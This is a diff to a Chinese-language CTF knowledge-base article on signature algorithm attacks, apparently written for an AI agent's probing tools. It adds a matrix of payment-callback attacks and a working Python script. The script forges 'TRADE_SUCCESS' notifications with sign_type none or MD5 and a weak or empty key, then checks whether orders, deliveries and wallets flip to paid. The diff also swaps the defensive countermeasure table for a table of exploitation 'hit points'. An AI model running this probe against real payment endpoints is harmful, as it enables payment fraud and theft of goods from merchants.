@@ -15,10 +15,10 @@ signals: ["algorithm downgrade", "算法降级", "alg none", "sign_type", "RS256
 mcp_tools: ["http_probe", "kb_router"]
 keywords: ["签名算法攻击", "algorithm downgrade", "alg none", "JWT算法混淆", "sign_type绕过", "编码攻击", "HMAC混淆"]
 difficulty: "advanced"
-tags: ["signature", "algorithm", "downgrade", "jwt", "crypto", "web-security", "ctf"]
+tags: ["signature", "algorithm", "downgrade", "jwt", "crypto", "payment", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
-related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signature/02-implementation"]
+last_updated: "2026-07-04"
+related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signature/02-implementation", "ctf-website/13-signature/04-canonicalization", "ctf-website/13-signature/06-replay-nonce", "ctf-website/12-payment/payment-callback-async", "ctf-website/12-payment/payment-logic"]
 ---
 # Signature Algorithm Attacks — 签名算法降级/混淆/None 攻击深度手册
 
@@ -29,6 +29,65 @@ related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signa
 > - [02-auth/jwt/02-algorithm-confusion.md](../02-auth/jwt/02-algorithm-confusion.md) — JWT RS256→HS256 公钥混淆
 > - [12-payment/payment-bypass.md](../12-payment/payment-bypass.md) — 支付签名绕过放在支付上下文
 > - [12-payment/payment-callback-async.md](../12-payment/payment-callback-async.md) — 回调签名伪造
+
+## 0. 支付回调算法动作矩阵
+
+算法字段一旦可控，不要只证明“签名层接受”。每个算法变体都要立刻读订单、流水、权益、钱包，确认是否进入 paid/delivered。
+
+| 算法变体 | Payload 变化 | 账本读取 | 命中信号 |
+|---|---|---|---|
+| `sign_type=MD5` | 强算法降到 MD5，复用弱 key 或空 key | `/api/orders/<id>`, `/api/payment/<id>` | pending -> paid |
+| `alg=none` / `sign_type=none` | 删除/置空签名 | 订单状态、权益、wallet | 无签名仍发货 |
+| `RS256 -> HS256` | 公钥作为 HMAC key | JWT claim、订单归属 | role/user/order_owner 改变 |
+| `MD5` vs `HMAC-MD5` | 把 HMAC 当 raw MD5 | payment log、notify log | invalid sign 变 success |
+| 编码混淆 | hex/base64/base64url/大小写 | sign error、订单状态 | 同摘要不同编码被接受 |
+
+```python
+# algorithm_payment_ledger_probe.py
+import hashlib
+import hmac
+import json
+import requests
+
+BASE = "https://target"
+S = requests.Session()
+
+def state(order_id):
+    paths = {
+        "order": f"/api/orders/{order_id}",
+        "payment": f"/api/payment/{order_id}",
+        "delivery": f"/api/orders/{order_id}/delivery",
+        "wallet": "/api/wallet",
+    }
+    out = {}
+    for name, path in paths.items():
+        r = S.get(BASE + path, timeout=8, allow_redirects=False)
+        out[name] = {"status": r.status_code, "len": len(r.text), "body": r.text[:300]}
+    return out
+
+def sign_md5(params, secret=""):
+    raw = "&".join(f"{k}={params[k]}" for k in sorted(params) if k != "sign")
+    return hashlib.md5((raw + secret).encode()).hexdigest()
+
+def sign_hs256(params, secret):
+    raw = "&".join(f"{k}={params[k]}" for k in sorted(params) if k != "sign")
+    return hmac.new(secret.encode(), raw.encode(), hashlib.sha256).hexdigest()
+
+def try_alg(order_id, alg, secret=""):
+    body = {
+        "out_trade_no": order_id,
+        "trade_status": "TRADE_SUCCESS",
+        "total_amount": "0.01",
+        "sign_type": alg,
+    }
+    body["sign"] = "" if alg.lower() == "none" else sign_md5(body, secret)
+    before = state(order_id)
+    r = S.post(BASE + "/notify", data=body, timeout=10, allow_redirects=False)
+    after = state(order_id)
+    print(json.dumps({"alg": alg, "before": before, "response": r.text[:300], "after": after}, ensure_ascii=False, indent=2))
+```
+
+输出保存为 `exports/algorithm_payment_ledger_probe.jsonl`。如果算法变体只改变响应文案，不改变订单/支付/权益状态，转 `04-canonicalization.md` 看字段是否被业务层丢弃。
 
 ## 1. 算法降级 (Algorithm Downgrade)
 
@@ -1865,18 +1924,18 @@ graph TD
     TRUNC_BYPASS --> FLAG
 ```
 
-## 对抗点清单
+## 命中点清单
 
-| 攻击类型 | 对抗措施 |
+| 攻击类型 | 命中点 |
 |---------|---------|
-| 算法降级 | 服务端固定白名单算法，拒绝客户端指定；`ALLOWED_ALGORITHMS = ["HMAC-SHA256", "RSA2"]` |
-| None 算法 | 检查算法字段值，拒绝 none/null/空字符串；对每个算法做实际验签 |
-| 算法混淆 | 公钥只用于 RS256/ES256 验证，禁止做 HMAC 密钥；不同算法使用不同 key 对象 |
-| 多算法回退 | 只使用单一算法，不遍历；或限制验证链长度为 1 |
-| 编码混淆 | 签名值严格规范化（hex lowercase）；拒绝非标准编码 |
-| 长度漏洞 | 签名长度固定且与算法匹配；拒绝空/超短签名 |
-| 双重编码 | 解码一次后重算签名对比，不信任客户端提供的 encoding |
-| 大小写 | 签名比较前标准化为 hex lowercase |
+| 算法降级 | 客户端 `sign_type/algorithm` 能决定验签函数；弱算法变体推进订单状态 |
+| None 算法 | `none/null/空字符串` 进入 success 分支，`notify_logs` 记录成功 |
+| 算法混淆 | 公钥、证书、JWKS 被当作 HMAC secret；role/order_owner 可改 |
+| 多算法回退 | 多个算法逐个尝试，弱算法先命中或错误吞掉后继续 |
+| 编码混淆 | hex/base64/base64url/大小写切换后同一摘要被接受 |
+| 长度漏洞 | 空签名、短签名、截断签名仍进入 paid/delivered |
+| 双重编码 | 服务端解码层数不同，签名值与业务字段分叉 |
+| 大小写 | 签名比较大小写不一致，大小写变体触发不同路径 |
 
 ## Evidence 交付标准
 
